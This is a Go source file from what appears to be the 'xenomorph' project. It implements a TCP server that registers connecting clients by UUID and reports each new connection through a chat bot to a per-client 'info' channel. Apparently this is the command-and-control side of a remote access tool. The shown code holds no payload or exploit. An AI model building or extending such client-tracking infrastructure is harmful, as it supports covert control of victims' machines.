package core

import (
	"net"
	"sync"

	"github.com/codevault-llc/xenomorph/internal/common"
	"github.com/codevault-llc/xenomorph/pkg/embeds"
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"go.uber.org/zap"
)

type Server struct {
	Port              string
	Listener          net.Listener
	Clients           map[string]*common.ClientData
	mu                sync.Mutex
	BotController     common.BotController
	MessageController common.MessageController
}

func NewServer(port string, botController common.BotController, messageController common.MessageController) *Server {
	return &Server{
		Port:              port,
		Clients:           make(map[string]*common.ClientData),
		BotController:     botController,
		MessageController: messageController,
	}
}

func (s *Server) Start() error {
	listener, err := net.Listen("tcp", ":"+s.Port)
	if err != nil {
		logger.Log.Error("Failed to start server:", zap.Error(err))
		return err
	}

	s.Listener = listener
	logger.Log.Info("Server started", zap.String("port", s.Port))

	for {
		conn, err := listener.Accept()
		if err != nil {
			logger.Log.Error("Error accepting connection", zap.Error(err))
			continue
		}

		go s.handleConnection(conn)
	}
}

func (s *Server) RegisterClient(data *common.ClientData) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Clients[data.UUID] = data

	err := s.BotController.GenerateUser(data)
	if err != nil {
		logger.Log.Error("Failed to generate user", zap.Error(err))
	}

	embed := embeds.ConnectionEmbed(data)
	err = s.BotController.SendEmbedToChannel(s.BotController.GetChannelFromUser(data.UUID, "info"), "", &embed)
	if err != nil {
		logger.Log.Error("Failed to send message to channel", zap.Error(err))
	}
}

func (s *Server) GetClientByAddress(addr net.Addr) *common.ClientData {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, client := range s.Clients {
		if client.Addr.String() == addr.String() {
			return client
		}
	}

	return nil
}

func (s *Server) GetClientByUUID(uuid string) *common.ClientData {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.Clients[uuid]
}
